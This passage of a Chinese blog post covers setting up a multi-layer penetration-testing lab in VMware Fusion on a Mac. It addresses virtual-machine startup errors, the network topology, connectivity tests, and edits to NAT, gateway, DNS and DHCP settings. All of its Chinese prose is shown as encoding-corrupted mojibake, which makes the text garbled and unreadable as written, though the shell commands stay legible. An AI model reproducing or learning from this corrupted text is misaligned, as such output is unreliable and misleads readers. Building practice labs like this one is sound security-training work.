æ³•å¯åŠ¨é—®é¢˜è§£å†³</h2><blockquote><p>macç¯å¢ƒæ‰“å¼€è™šæ‹Ÿæœºæ—¶çš„è¸©å‘è®°å½•ï¼š</p><ul><li>é—®é¢˜ï¼šç›´æ¥è¿è¡Œvmxæ–‡ä»¶æ‰“ä¸å¼€è™šæ‹Ÿæœºï¼ŒæŠ¥å¦‚ä¸‹çš„é”™è¯¯ï¼š</li></ul><img src="/2024/12/30/zong-he-shen-tou/san-ceng-wang-luo-yu-shen-tou-ba-chang-shi-zhan/%E6%88%AA%E5%B1%8F2024-12-30%2010.38.46.png" style="zoom:50%;"><p>â€‹     1ï¼‰å°è¯•åˆ é™¤lckæ–‡ä»¶ï¼Œæ— æ•ˆã€‚ </p><p>â€‹     2ï¼‰å°è¯•ä¿®æ”¹vmxæ–‡ä»¶çš„vmci0.present = â€œTRUEâ€ä¸ºFALSEï¼Œæ— æ•ˆã€‚</p><p>â€‹     3ï¼‰å°è¯•åœ¨è§£å‹åçš„é¡¹ç›®æ–‡ä»¶å¤¹æ·»åŠ .vmwarevmåç¼€ï¼Œæ‰“å¼€æ—¶ä»ç„¶æŠ¥ç›¸åŒçš„é”™ã€‚</p><p>â€‹     4ï¼‰VMware fusionç›´æ¥ä»ç°æœ‰ç£ç›˜æ–°å»ºè™šæ‹Ÿæœºï¼Œç£ç›˜é€‰æ‹©ä»vmware workstationå¯¼å‡ºçš„è™šæ‹Ÿæœºçš„vmdkæ–‡ä»¶ã€‚</p><p>â€‹     å‚è€ƒï¼š<a href="https://blog.csdn.net/u014028317/article/details/97311660">https://blog.csdn.net/u014028317/article/details/97311660</a></p><p>â€‹     ä½†æ˜¯ç¬”è€…æŒ‰ç…§æ­¤æ•™ç¨‹æ“ä½œï¼Œå‡ºç°çš„é—®é¢˜æ˜¯vmdkæ–‡ä»¶ç°è‰²æ— æ³•é€‰ä¸­ï¼Œ   ç›®å‰æ²¡æ‰¾åˆ°è§£å†³åŠæ³•ã€‚</p><img src="/2024/12/30/zong-he-shen-tou/san-ceng-wang-luo-yu-shen-tou-ba-chang-shi-zhan/%E6%88%AA%E5%B1%8F2024-12-30%2010.23.56.png" style="zoom:50%;"><ul><li>è§£å†³ï¼šæœ€åçš„è§£å†³æ–¹æ³•æ˜¯æŒ‰ç…§scsi0:0.fileNameçš„é…ç½®ä¿®æ”¹ç›¸å…³çš„æ–‡ä»¶å</li></ul><p>æ¯æ¬¡ç‚¹å‡»vmxæ–‡ä»¶å¯åŠ¨çš„æ—¶å€™ï¼Œæç¤ºçš„æ˜¯â€œUbuntu 64 ä½ (Web 1).vmdkæ–‡ä»¶æ‰¾ä¸åˆ°â€ï¼Œä¸€çœ‹æœ¬èº«è§£å‹è™šæ‹Ÿæœºä¹‹åçš„æ–‡ä»¶åç¡®å®ä¸ç¬¦åˆè¦æ±‚ï¼Œå¸¦ä¸ªå¥‡å¥‡æ€ªæ€ªçš„×’ï¼ˆæœ¬æ¥çœ‹è¿™ä¸ª×’ä¸é¡ºçœ¼ï¼‰ï¼ŒæŠŠæ‰€æœ‰å¸¦×’çš„æ–‡ä»¶åéƒ½æ”¹æˆâ€Ubuntu 64 ä½ (Web 1)â€¦â€ã€‚</p><p>ç„¶åå†åŒå‡»vmxå¯åŠ¨ï¼Œæå®šï¼š</p><img src="/2024/12/30/zong-he-shen-tou/san-ceng-wang-luo-yu-shen-tou-ba-chang-shi-zhan/%E6%88%AA%E5%B1%8F2024-12-30%2011.28.47.png" style="zoom: 30%;"><p>é äº’è”ç½‘ä¸å¦‚é è‡ªå·±æ’æŸ¥ï¼š1ï¼‰è¯¦ç»†é˜…è¯»æ€è€ƒæç¤ºä¿¡æ¯ã€‚2ï¼‰æ’æŸ¥ç³»ç»Ÿè¿è¡Œæ—¥å¿—ã€‚</p><p>é¶åœºç¯å¢ƒä¸­çš„å…¶ä»–è™šæ‹Ÿæœºçš„å¯åŠ¨å¦‚æœé‡åˆ°ç±»ä¼¼çš„é—®é¢˜ï¼Œè§£å†³æ–¹æ³•ä¹Ÿæ˜¯å¯¹ç…§vmxæ–‡ä»¶çš„scsi0:0.fileName çš„é…ç½®ä¿®æ”¹ç›¸åº”çš„æ–‡ä»¶åå³å¯ã€‚</p></blockquote><h2 id="2-4-é¶åœºç¯å¢ƒæ­å»º"><a href="#2-4-é¶åœºç¯å¢ƒæ­å»º" class="headerlink" title="2.4 é¶åœºç¯å¢ƒæ­å»º"></a>2.4 é¶åœºç¯å¢ƒæ­å»º</h2><p>ä¸‹é¢æ˜¯æˆ‘æ¢³ç†çš„é¶åœºçš„é€»è¾‘æ¶æ„ï¼Œæ­å»ºçš„è¿‡ç¨‹ä¸­é‡ç‚¹åœ¨äºææ¸…æ¥šç½‘ç»œé—´çš„äº’è®¿å…³ç³»ã€è™šæ‹Ÿç½‘ç»œçš„è®¾ç½®å’Œå„ä¸»æœºçš„ç½‘å¡è¿æ¥ã€‚</p><img src="/2024/12/30/zong-he-shen-tou/san-ceng-wang-luo-yu-shen-tou-ba-chang-shi-zhan/%E6%88%AA%E5%B1%8F2024-12-30%2014.42.59.png" alt="é¶åœºç¯å¢ƒç¤ºæ„å›¾" style="zoom:50%;"><p>æˆ‘çš„macä¸Šç›®å‰çš„NATç½‘æ®µåœ°å€æ˜¯192.168.155.0/24ã€‚</p><p>ä¸€å¼€å§‹çš„æ—¶å€™æˆ‘çš„æƒ³æ³•æ˜¯æ–°å»ºä¸€ä¸ªvmnetï¼Œè®¾ç½®ä¸ºNATæ¨¡å¼ï¼Œå¹¶ä¸”é…ç½®ä¸º192.168.52.0/24ç½‘æ®µï¼Œè®¾ç½®å¦‚ä¸‹ï¼š</p><p>ï¼ˆä½†æ˜¯ï¼Œåé¢å‘ç°è¿™ç§è®¾ç½®æ–¹æ³•ä¼šå¯¼è‡´äºŒå±‚ç½‘ç»œï¼ˆ192.168.52.0/24ç½‘æ®µï¼‰æ— æ³•è®¿é—®äº’è”ç½‘ï¼Œæ‰€ä»¥æˆ‘æœ€åè¿˜æ˜¯ç”¨çš„è‡ªå¸¦çš„NAT vmnet8è™šæ‹Ÿç½‘ç»œï¼Œå…·ä½“è®¾ç½®åé¢æœ‰è¯¦ç»†çš„è¸©å‘è®°å½•ï¼‰</p><img src="/2024/12/30/zong-he-shen-tou/san-ceng-wang-luo-yu-shen-tou-ba-chang-shi-zhan/%E6%88%AA%E5%B1%8F2024-12-30%2013.49.05.png" alt="vmnet2çš„é…ç½®ï¼ˆä½¿ç”¨NATï¼‰" style="zoom:40%;"><p>æ–°å»ºä¸€ä¸ªä»…ä¸»æœºæ¨¡å¼çš„vmnet14ï¼Œè®¾ç½®å¦‚ä¸‹ï¼š</p><img src="/2024/12/30/zong-he-shen-tou/san-ceng-wang-luo-yu-shen-tou-ba-chang-shi-zhan/%E6%88%AA%E5%B1%8F2024-12-30%2013.47.59.png" alt="vmnet14çš„é…ç½®ï¼ˆä»…ä¸»æœºæ¨¡å¼ï¼‰" style="zoom:40%;"><p>å°†vmnet2ä½œä¸ºç¬¬äºŒå±‚è™šæ‹Ÿç½‘ç»œï¼Œvmnet14ä½œä¸ºç¬¬ä¸‰å±‚è™šæ‹Ÿç½‘ç»œã€‚è¿™æ ·ä»¥æ¥ï¼š</p><ul><li>ç¬¬äºŒå±‚ç½‘ç»œä¸­çš„æ‰€æœ‰ä¸»æœºçš†å¯ä»¥ä¸Šç½‘ï¼ˆNATæ¨¡å¼ï¼‰ï¼Œä½†æ˜¯ä½äºç¬¬ä¸‰å±‚ç½‘ç»œä¸­çš„æ‰€æœ‰ä¸»æœºéƒ½ä¸ä¸å¤–ç½‘ç›¸è¿é€šï¼Œä¸èƒ½ä¸Šç½‘ã€‚</li><li>DMZåŒºä¸­çš„web1æœåŠ¡å™¨å¯ä»¥è®¿é—®äº’è”ç½‘ï¼ˆé€šè¿‡ä¸¤å—ç½‘å¡å‡å¯ï¼‰ï¼Œé€šè¿‡æ¡¥æ¥çš„æ–¹å¼å°†web1æš´éœ²åœ¨å±€åŸŸç½‘ä¸­ï¼ˆæ¨¡æ‹Ÿæš´éœ²åœ¨äº’è”ç½‘ï¼‰ã€‚</li><li>hackerè™šæ‹Ÿæœºï¼ˆkaliï¼‰é€šè¿‡æ¡¥æ¥çš„æ–¹å¼ä¸web1ã€ç‰©ç†æœºå…±åŒå¤„äºä¸€ä¸ªå±€åŸŸç½‘ï¼Œæ¨¡æ‹Ÿé»‘å®¢ä»äº’è”ç½‘å¯¹DMZåŒºå‘èµ·æ”»å‡»æ‰“ç‚¹ã€‚</li></ul><img src="/2024/12/30/zong-he-shen-tou/san-ceng-wang-luo-yu-shen-tou-ba-chang-shi-zhan/%E6%88%AA%E5%B1%8F2024-12-30%2014.52.05.png" alt="kaliæ”»å‡»æœº" style="zoom:35%;"><p>ping DMZåŒºçš„web1å¯ä»¥è¿é€šï¼š</p><img src="/2024/12/30/zong-he-shen-tou/san-ceng-wang-luo-yu-shen-tou-ba-chang-shi-zhan/%E6%88%AA%E5%B1%8F2024-12-30%2014.52.37.png" alt="ping web1" style="zoom:40%;"><p>ping äºŒå±‚ç½‘ç»œæ˜¯æ— æ³•è¿é€šçš„ï¼š</p><img src="/2024/12/30/zong-he-shen-tou/san-ceng-wang-luo-yu-shen-tou-ba-chang-shi-zhan/%E6%88%AA%E5%B1%8F2024-12-30%2014.53.50.png" alt="ping web1çš„å¦ä¸€ä¸ªç½‘å¡æ˜¯æ— æ³•pingé€šçš„" style="zoom:40%;"><p>ping web1çš„å¦ä¸€ä¸ªç½‘å¡æ˜¯æ— æ³•pingé€šçš„ï¼Œæ”»å‡»æœºåªèƒ½é€šè¿‡æ¡¥æ¥æ–¹å¼æš´éœ²å‡ºæ¥çš„192.168.43.253ç«¯å£è¿›è¡Œæ¸—é€ã€‚</p><h2 id="2-5-ç½‘ç»œè¿é€šæ€§æµ‹è¯•"><a href="#2-5-ç½‘ç»œè¿é€šæ€§æµ‹è¯•" class="headerlink" title="2.5 ç½‘ç»œè¿é€šæ€§æµ‹è¯•"></a>2.5 ç½‘ç»œè¿é€šæ€§æµ‹è¯•</h2><h3 id="2-5-1-æ ¸å¿ƒç½‘ï¼ˆä¸‰å±‚ç½‘ç»œï¼‰å†…éƒ¨è¿é€šæ€§"><a href="#2-5-1-æ ¸å¿ƒç½‘ï¼ˆä¸‰å±‚ç½‘ç»œï¼‰å†…éƒ¨è¿é€šæ€§" class="headerlink" title="2.5.1 æ ¸å¿ƒç½‘ï¼ˆä¸‰å±‚ç½‘ç»œï¼‰å†…éƒ¨è¿é€šæ€§"></a>2.5.1 æ ¸å¿ƒç½‘ï¼ˆä¸‰å±‚ç½‘ç»œï¼‰å†…éƒ¨è¿é€šæ€§</h3><p>DCå’ŒPC2å¯ä»¥äº’ç›¸è®¿é—®</p><img src="/2024/12/30/zong-he-shen-tou/san-ceng-wang-luo-yu-shen-tou-ba-chang-shi-zhan/%E6%88%AA%E5%B1%8F2024-12-30%2015.01.07.png" alt="æ ¸å¿ƒç½‘DCä¸PC2è¿é€šæ€§æµ‹è¯•" style="zoom:50%;"><h3 id="2-5-2-æ ¸å¿ƒç½‘å’ŒäºŒå±‚ç½‘ç»œçš„è¿é€šæ€§"><a href="#2-5-2-æ ¸å¿ƒç½‘å’ŒäºŒå±‚ç½‘ç»œçš„è¿é€šæ€§" class="headerlink" title="2.5.2 æ ¸å¿ƒç½‘å’ŒäºŒå±‚ç½‘ç»œçš„è¿é€šæ€§"></a>2.5.2 æ ¸å¿ƒç½‘å’ŒäºŒå±‚ç½‘ç»œçš„è¿é€šæ€§</h3><img src="/2024/12/30/zong-he-shen-tou/san-ceng-wang-luo-yu-shen-tou-ba-chang-shi-zhan/%E6%88%AA%E5%B1%8F2024-12-30%2015.06.23.png" alt="æ ¸å¿ƒç½‘å’ŒäºŒå±‚ç½‘ç»œä¹‹é—´çš„è”é€šæ€§" style="zoom:50%;"><p>PC1å¯ä»¥pingé€šDCå’ŒPC2ï¼Œä½†æ˜¯åä¹‹ä¸è¡Œï¼Œåˆ†æå¯èƒ½æ˜¯PC1çš„é˜²ç«å¢™å½±å“ã€‚</p><h3 id="2-5-3-DMZä¸äºŒå±‚ç½‘ç»œçš„è¿é€šæ€§"><a href="#2-5-3-DMZä¸äºŒå±‚ç½‘ç»œçš„è¿é€šæ€§" class="headerlink" title="2.5.3 DMZä¸äºŒå±‚ç½‘ç»œçš„è¿é€šæ€§"></a>2.5.3 DMZä¸äºŒå±‚ç½‘ç»œçš„è¿é€šæ€§</h3><img src="/2024/12/30/zong-he-shen-tou/san-ceng-wang-luo-yu-shen-tou-ba-chang-shi-zhan/%E6%88%AA%E5%B1%8F2024-12-30%2015.07.48.png" style="zoom:50%;"><h3 id="2-5-4-DMZè®¿é—®äº’è”ç½‘"><a href="#2-5-4-DMZè®¿é—®äº’è”ç½‘" class="headerlink" title="2.5.4 DMZè®¿é—®äº’è”ç½‘"></a>2.5.4 DMZè®¿é—®äº’è”ç½‘</h3><img src="/2024/12/30/zong-he-shen-tou/san-ceng-wang-luo-yu-shen-tou-ba-chang-shi-zhan/%E6%88%AA%E5%B1%8F2024-12-30%2015.10.35.png" alt="DMZåŒºå¯ä»¥è®¿é—®äº’è”ç½‘" style="zoom:50%;"><h3 id="2-5-5-äºŒå±‚ç½‘ç»œè®¿é—®äº’è”ç½‘"><a href="#2-5-5-äºŒå±‚ç½‘ç»œè®¿é—®äº’è”ç½‘" class="headerlink" title="2.5.5 äºŒå±‚ç½‘ç»œè®¿é—®äº’è”ç½‘"></a>2.5.5 äºŒå±‚ç½‘ç»œè®¿é—®äº’è”ç½‘</h3><img src="/2024/12/30/zong-he-shen-tou/san-ceng-wang-luo-yu-shen-tou-ba-chang-shi-zhan/%E6%88%AA%E5%B1%8F2024-12-30%2015.11.18.png" alt="äºŒå±‚ç½‘ç»œæ— æ³•è®¿é—®äº’è”ç½‘" style="zoom:50%;"><p>äºŒå±‚ç½‘ç»œå‘ç°æ— æ³•è®¿é—®äº’è”ç½‘ï¼Œåˆ†æå¯èƒ½æ˜¯æ–°è®¾ç½®çš„NATæ¨¡å¼çš„vmnet2æœªç”Ÿæ•ˆï¼Œå› æ­¤å†³å®šä¿®æ”¹é»˜è®¤vmnet8çš„NATç½‘æ®µï¼ˆå¡«ä¸€å¼€å§‹å·æ‡’çš„å‘ï¼‰ï¼š</p><blockquote><ol><li><p><strong>ä¿®æ”¹ç½‘ç»œé…ç½®æ–‡ä»¶</strong>ï¼š</p><ul><li><p>æ‰“å¼€ç»ˆç«¯ï¼Œä½¿ç”¨ä»¥ä¸‹å‘½ä»¤ç¼–è¾‘VMware Fusionçš„ç½‘ç»œé…ç½®æ–‡ä»¶ï¼š</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">sudo vi /Library/Preferences/VMware\ Fusion/networking<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>åœ¨è¯¥æ–‡ä»¶ä¸­ï¼Œæ‰¾åˆ°ä¸NATç›¸å…³çš„é…ç½®éƒ¨åˆ†ï¼Œä¾‹å¦‚<code>vmnet8</code>ï¼Œç„¶åä¿®æ”¹<code>SUBNET</code>ä¸ºæƒ³è¦çš„ç½‘æ®µï¼Œä¾‹å¦‚<code>192.168.52.0</code>ã€‚åŒæ—¶ï¼Œå°†<code>DHCP</code>è®¾ç½®ä¸º<code>no</code>ä»¥ä½¿ç”¨é™æ€IPï¼ˆåé¢å‘ç°ä¸éœ€è¦å°†DHCPè®¾ç½®ä¸ºnoï¼‰ã€‚</p></li></ul></li><li><p><strong>ä¿®æ”¹NATé…ç½®æ–‡ä»¶</strong>ï¼š</p><ul><li><p>ç»§ç»­åœ¨ç»ˆç«¯ä¸­ç¼–è¾‘NATé…ç½®æ–‡ä»¶ï¼š</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">sudo vi /Library/Preferences/VMware\ Fusion/vmnet8/nat.conf<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>åœ¨è¯¥æ–‡ä»¶ä¸­ï¼Œè®¾ç½®ç½‘å…³åœ°å€ï¼Œä¾‹å¦‚<code>192.168.52.1</code>ï¼Œç¡®ä¿ç½‘å…³çš„IPä¸è®¾ç½®çš„ç½‘æ®µä¸€è‡´ã€‚</p></li></ul></li></ol><p>networkingåŸå§‹é…ç½®ï¼š</p><img src="/2024/12/30/zong-he-shen-tou/san-ceng-wang-luo-yu-shen-tou-ba-chang-shi-zhan/%E6%88%AA%E5%B1%8F2024-12-30%2015.27.16.png" style="zoom:53%;"><p>networkingä¿®æ”¹åçš„é…ç½®ï¼š</p><img src="/2024/12/30/zong-he-shen-tou/san-ceng-wang-luo-yu-shen-tou-ba-chang-shi-zhan/%E6%88%AA%E5%B1%8F2024-12-30%2015.28.50.png" style="zoom:50%;"><p>nat.confåŸå§‹é…ç½®ï¼š</p><img src="/2024/12/30/zong-he-shen-tou/san-ceng-wang-luo-yu-shen-tou-ba-chang-shi-zhan/%E6%88%AA%E5%B1%8F2024-12-30%2015.33.05.png" alt="æˆªå±2024-12-30 15.33.05" style="zoom:50%;"><p>nat.confä¿®æ”¹åçš„é…ç½®ï¼š</p><img src="/2024/12/30/zong-he-shen-tou/san-ceng-wang-luo-yu-shen-tou-ba-chang-shi-zhan/%E6%88%AA%E5%B1%8F2024-12-30%2015.33.32.png" alt="æˆªå±2024-12-30 15.33.32" style="zoom:50%;"><p>é‡å¯vmware fusionã€‚</p></blockquote><p>ä¿®æ”¹å®Œæˆä¹‹åè™šæ‹Ÿæœºå¦‚æœè¿˜æ˜¯åŸå…ˆçš„è®¾ç½®ï¼Œå³äºŒå±‚ç½‘ç»œéƒ½åœ¨vmnet2ï¼ˆ192.168.52.0/24ï¼‰ä¸­ã€‚ping baidu.comä¸é€šï¼Œæ— æ³•è®¿é—®äº’è”ç½‘ã€‚å°è¯•å–æ¶ˆvmnet2çš„NATé€‰é¡¹ï¼Œè¿˜æ˜¯ä¸è¡Œã€‚</p><img src="/2024/12/30/zong-he-shen-tou/san-ceng-wang-luo-yu-shen-tou-ba-chang-shi-zhan/%E6%88%AA%E5%B1%8F2024-12-30%2015.39.27.png" alt="" style="zoom:50%;"><img src="/2024/12/30/zong-he-shen-tou/san-ceng-wang-luo-yu-shen-tou-ba-chang-shi-zhan/%E6%88%AA%E5%B1%8F2024-12-30%2015.40.29.png" alt="æˆªå±2024-12-30 15.40.29" style="zoom:50%;"><p>æ‰€ä»¥ï¼Œå°†æ‰€æœ‰è¿æ¥äºŒå±‚ç½‘ç»œçš„è™šæ‹Ÿæœºçš„å¯¹åº”ç½‘ç»œé€‚é…å™¨æ”¹æˆNATæ¨¡å¼ï¼ˆvmnet8ï¼‰ï¼Œæµ‹è¯•ä¹‹å‰çš„NATç½‘æ®µæ›´æ”¹æ˜¯å¦ç”Ÿæ•ˆã€‚</p><img src="/2024/12/30/zong-he-shen-tou/san-ceng-wang-luo-yu-shen-tou-ba-chang-shi-zhan/%E6%88%AA%E5%B1%8F2024-12-30%2015.49.34.png" style="zoom:60%;"><p>å‘ç°è¿˜æ˜¯æ— æ³•è®¿é—®äº’è”ç½‘ï¼Œåˆ†æå¯èƒ½å› ä¸ºè€ç‰ˆæœ¬çš„vmwareåœ¨åˆ›å»ºè™šæ‹Ÿç½‘ç»œçš„æ—¶å€™ä¼šæŠŠvmnetxè™šæ‹Ÿç½‘å¡çš„ipè®¾ç½®ä¸ºx.x.x..1ï¼ŒæŠŠè™šæ‹Ÿç½‘ç»œçš„ç½‘å…³è®¾ç½®ä¸ºx.x.x.2ï¼Œæ‰€ä»¥ç›´æ¥ä¸‹è½½æ¥çš„è™šæ‹Ÿæœºæœ¬èº«ä¹Ÿéµå¾ªäº†è¿™ä¸ªx.x.x.2çš„ç½‘å…³é…ç½®ã€‚æ‰€ä»¥è¦ä¹ˆæ”¹vmnet8è™šæ‹Ÿç½‘ç»œçš„è®¾ç½®ï¼Œè¦ä¹ˆæ”¹è™šæ‹Ÿæœºæœ¬èº«çš„é…ç½®ã€‚</p><p>é¦–å…ˆï¼Œå°è¯•å°†vmnet8çš„ç½‘å…³è®¾ç½®ä¸ºx.x.x.2ï¼Œæ”¹å®Œä¹‹åé‡å¯VMwareï¼Œå‘ç°ç½‘å…³çš„ipåˆå˜æˆ192.168.52.1äº†ä¸”äºŒå±‚è™šæ‹Ÿæœºä»ç„¶æ— æ³•è®¿é—®äº’è”ç½‘ã€‚</p><blockquote><p>Fusion 12.0 å¼€å§‹ NAT ç½‘å…³çš„ IP å˜æ›´ä¸º x.x.x.1ï¼Œæ›´åŠ ç¬¦åˆä½¿ç”¨ä¹ æƒ¯ã€‚</p><p>ç»æµ‹è¯• Fusion 12.1 NAT ç½‘å…³ IP åŒæ ·ä¸º x.x.x.1ï¼Œä½†æ˜¯æ¯”è¾ƒé—æ†¾ï¼ŒFusion 12.2 åˆä¿®æ”¹ä¸º .2ã€‚</p><p>å¦‚æœè™šæ‹Ÿæœºæœ¬èº«çš„é…ç½®ä¸æ­£ç¡®å°†å¯¼è‡´VM æ— æ³•è®¿é—®å¤–éƒ¨ç½‘ç»œã€‚</p></blockquote><img src="/2024/12/30/zong-he-shen-tou/san-ceng-wang-luo-yu-shen-tou-ba-chang-shi-zhan/%E6%88%AA%E5%B1%8F2024-12-30%2015.54.14.png" style="zoom:50%;"><p>æˆ‘ç”¨çš„vmware fusionçš„ç‰ˆæœ¬æ˜¯**ä¸“ä¸šç‰ˆ 12.1.2 (17964953)**ï¼Œæ‰€ä»¥fusionå¯èƒ½å¼ºåˆ¶å°†ç½‘å…³çš„ipåº”è¯¥å’Œè™šæ‹Ÿç½‘å¡çš„ipä¿æŒä¸€è‡´ï¼Œéƒ½æ˜¯x.x.x.1ã€‚</p><p>é‚£ä¹ˆç¬¬ä¸€ç§æ–¹å¼ï¼ˆæ”¹vmnet8ç½‘å…³é…ç½®ï¼‰ä¸è¡Œï¼Œå°±åªèƒ½ä¿®æ”¹è™šæ‹Ÿæœºæœ¬èº«çš„ç½‘ç»œé…ç½®äº†ã€‚</p><h4 id="1ï¼‰äºŒå±‚ç½‘ç»œâ€”â€”web2"><a href="#1ï¼‰äºŒå±‚ç½‘ç»œâ€”â€”web2" class="headerlink" title="1ï¼‰äºŒå±‚ç½‘ç»œâ€”â€”web2"></a>1ï¼‰äºŒå±‚ç½‘ç»œâ€”â€”web2</h4><ul><li>ç½‘å¡é…ç½®</li></ul><p>æŸ¥çœ‹ubuntu web2çš„ç½‘å¡é…ç½®ï¼š</p><p><code>cat /etc/network/interfaces</code></p><img src="/2024/12/30/zong-he-shen-tou/san-ceng-wang-luo-yu-shen-tou-ba-chang-shi-zhan/%E6%88%AA%E5%B1%8F2024-12-30%2015.57.01.png" style="zoom:50%;"><p>å‘ç°ç½‘å…³é…ç½®æœç„¶æ˜¯192.168.52.2ï¼Œæ”¹æˆ192.168.52.1ã€‚</p><img src="/2024/12/30/zong-he-shen-tou/san-ceng-wang-luo-yu-shen-tou-ba-chang-shi-zhan/%E6%88%AA%E5%B1%8F2024-12-30%2015.58.35.png" alt="æˆªå±2024-12-30 15.58.35" style="zoom:50%;"><p>å¯åŠ¨ç½‘å¡ï¼š<code>sudo ifup eth0</code></p><img src="/2024/12/30/zong-he-shen-tou/san-ceng-wang-luo-yu-shen-tou-ba-chang-shi-zhan/%E6%88%AA%E5%B1%8F2024-12-30%2016.05.29.png" style="zoom:50%;"><p>pingä¸é€šbaiduï¼Œä½†èƒ½pingé€š8.8.8.8ï¼Œè¯´æ˜èƒ½è®¿é—®äº’è”ç½‘äº†ï¼Œä½†æ˜¯åŸŸåè§£ææœ‰é—®é¢˜ã€‚</p><ul><li>åŸŸåè§£æé…ç½®</li></ul><p>æŸ¥çœ‹åŸŸåè§£æçš„é…ç½®ï¼Œå‘ç°é…ç½®çš„æ˜¯192.168.52.2ï¼Œæ‰€ä»¥ä¿®æ”¹æˆ192.168.52.1</p><img src="/2024/12/30/zong-he-shen-tou/san-ceng-wang-luo-yu-shen-tou-ba-chang-shi-zhan/%E6%88%AA%E5%B1%8F2024-12-30%2016.06.20.png" style="zoom:50%;"><p>æœ€ç»ˆæˆåŠŸè”é€šäº’è”ç½‘ã€‚</p><img src="/2024/12/30/zong-he-shen-tou/san-ceng-wang-luo-yu-shen-tou-ba-chang-shi-zhan/%E6%88%AA%E5%B1%8F2024-12-30%2016.07.24.png" style="zoom:50%;"><p>æ¶‰åŠåˆ°vmnet2çš„æ‰€æœ‰ç½‘å¡éƒ½éœ€è¦é‡æ–°è¿›è¡Œé€‚é…ã€‚</p><h4 id="2ï¼‰äºŒå±‚ç½‘ç»œâ€”â€”PC1"><a href="#2ï¼‰äºŒå±‚ç½‘ç»œâ€”â€”PC1" class="headerlink" title="2ï¼‰äºŒå±‚ç½‘ç»œâ€”â€”PC1"></a>2ï¼‰äºŒå±‚ç½‘ç»œâ€”â€”PC1</h4><p>ä¿®æ”¹ç½‘å¡é…ç½®çš„æ—¶å€™éœ€è¦ç™»å½•åŸŸç®¡ç†å‘˜è´¦æˆ·ï¼Œéœ€è¦å¯åŠ¨DCã€‚</p><p>ä¿®æ”¹å‰çš„é…ç½®ï¼š</p><p><img src="/2024/12/30/zong-he-shen-tou/san-ceng-wang-luo-yu-shen-tou-ba-chang-shi-zhan/%E6%88%AA%E5%B1%8F2024-12-30%2016.16.00.png" alt="æˆªå±2024-12-30 16.16.00"></p><p>ä¿®æ”¹åï¼š</p><img src="/2024/12/30/zong-he-shen-tou/san-ceng-wang-luo-yu-shen-tou-ba-chang-shi-zhan/%E6%88%AA%E5%B1%8F2024-12-30%2016.16.51.png" style="zoom:90%;"><p>é»˜è®¤ç½‘å…³å’ŒDNSæœåŠ¡å™¨éƒ½æ”¹æˆ192.168.52.1ã€‚</p><ul><li>å¾…ç½‘å¡ç”Ÿæ•ˆåæµ‹è¯•å‘ç°è¿˜æ˜¯æ— æ³•è®¿é—®äº’è”ç½‘å’Œweb2ï¼š</li></ul><p>å°è¯•å…³é—­é˜²ç«å¢™å°è¯•ï¼ˆä¹Ÿéœ€è¦åŸŸç®¡ç†å‘˜æƒé™ï¼‰ã€‚</p><img src="/2024/12/30/zong-he-shen-tou/san-ceng-wang-luo-yu-shen-tou-ba-chang-shi-zhan/%E6%88%AA%E5%B1%8F2024-12-30%2016.30.11.png" style="zoom:50%;"><p>æœ¬æ¥web2æ— æ³•pingé€šPC1ï¼Œç°åœ¨å¯ä»¥äº†ã€‚</p><img src="/2024/12/30/zong-he-shen-tou/san-ceng-wang-luo-yu-shen-tou-ba-chang-shi-zhan/%E6%88%AA%E5%B1%8F2024-12-30%2016.31.07.png" style="zoom:50%;"><p>ä½†PC1è¿˜æ˜¯æ— æ³•è®¿é—®äº’è”ç½‘ï¼Œå¹¶ä¸”PC1ä¹Ÿæ— æ³•è®¿é—®web2ã€‚</p><img src="/2024/12/30/zong-he-shen-tou/san-ceng-wang-luo-yu-shen-tou-ba-chang-shi-zhan/%E6%88%AA%E5%B1%8F2024-12-30%2016.33.19.png" alt="æˆªå±2024-12-30 16.33.19" style="zoom:50%;"><img src="/2024/12/30/zong-he-shen-tou/san-ceng-wang-luo-yu-shen-tou-ba-chang-shi-zhan/%E6%88%AA%E5%B1%8F2024-12-30%2016.39.09.png" alt="æˆªå±2024-12-30 16.39.09" style="zoom:50%;"><p>æ˜¾ç¤ºæ— internetè®¿é—®æƒé™ï¼Œå¹¶ä¸”æœ‰ä¸ªå¤šé‡ç½‘ç»œçš„æç¤ºã€‚</p><img src="/2024/12/30/zong-he-shen-tou/san-ceng-wang-luo-yu-shen-tou-ba-chang-shi-zhan/%E6%88%AA%E5%B1%8F2024-12-30%2016.47.37.png" style="zoom:50%;"><p>å›è¿‡å¤´å»å°è¯•ç”¨web2è®¿é—®äº’è”ç½‘ï¼Œå‘ç°web2åˆä¸èƒ½è®¿é—®äº’è”ç½‘äº†ï¼Œååˆ†å¥‡æ€ªã€‚</p><ul><li>vmnet8 å¼€å¯DHCPæœåŠ¡</li></ul><p>çŒœæµ‹ä¼šä¸ä¼šæ˜¯ä¹‹å‰é…ç½®vmnet8æ—¶å°†DHCPæœåŠ¡å…³é—­çš„åŸå› </p><img src="/2024/12/30/zong-he-shen-tou/san-ceng-wang-luo-yu-shen-tou-ba-chang-shi-zhan/%E6%88%AA%E5%B1%8F2024-12-31%2009.47.53.png" style="zoom:50%;"><p>æ‰€ä»¥å°† answer VNET_8_DHCP no æ”¹æˆyesã€‚</p><p>ç„¶åæ‰§è¡Œä¸‹é¢çš„å‘½ä»¤åŒæ­¥é…ç½®ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> /Applications/VMware<span class="token punctuation">\</span> Fusion.app/Contents/Library/vmnet-cli <span class="token parameter variable">--configure</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>vmnet-cli å°†æ ¹æ®ä¸Šè¿°ä¿®æ”¹çš„åœ°å€æ®µè‡ªåŠ¨ä¿®æ”¹ dhcpd.conf å’Œ nat.conf ä¸­çš„ IP åœ°å€ã€‚</p><img src="/2024/12/30/zong-he-shen-tou/san-ceng-wang-luo-yu-shen-tou-ba-chang-shi-zhan/%E6%88%AA%E5%B1%8F2024-12-30%2017.06.27.png" style="zoom:50%;"><p>æŸ¥çœ‹ dhcpd.conf å’Œ nat.conf é…ç½®æ–‡ä»¶ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">cat</span> /Library/Preferences/VMware<span class="token punctuation">\</span> Fusion/vmnet8/dhcpd.conf<span class="token function">cat</span> /Library/Preferences/VMware<span class="token punctuation">\</span> Fusion/vmnet8/nat.conf<span 